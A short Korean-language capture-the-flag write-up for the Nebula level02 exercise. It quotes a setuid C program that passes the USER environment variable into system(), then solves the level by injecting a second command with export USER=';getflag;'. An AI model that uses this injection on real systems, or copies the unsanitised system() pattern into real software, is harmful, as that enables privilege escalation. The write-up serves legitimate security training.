# Exploit-exercise Nebula Level02
```
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.
```

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

이번에도 취약점이 있는 소스코드를 주며 flag02 유저의 권한으로 getflag를 실행하라고 한다.  
asprintf 를 통해 buffer 에 getenv로 USER 라는 환경변수의 내용을 가져와서 넣는다.

그리고 system 함수를 통해 buffer 를 실행하는데, 이때 일어날 수 있는 취약점이 있다.

바로 커맨드 인젝션(Command Injection)이다.  
리눅스 쉘에서 중간에 ; 를 사용하면 여러개의 명령어를 실행시킬 수 있다.  
이를 이용해서 getflag 를 실행시키면 된다.

그렇다면 export 명령어를 통해 USER 라는 환경변수에

```
;getflag;
```

를 넣게되면
- /bin/echo
- getflag
- is cool
이렇게 3개의 명령이 실행될 것이다.

```
export USER=";getflag;"
/home/flag02/flag02
```

라고 입력하게 되면

```
You have successfully executed getflag on a target account
```

라고 뜨면서 풀리게 된다.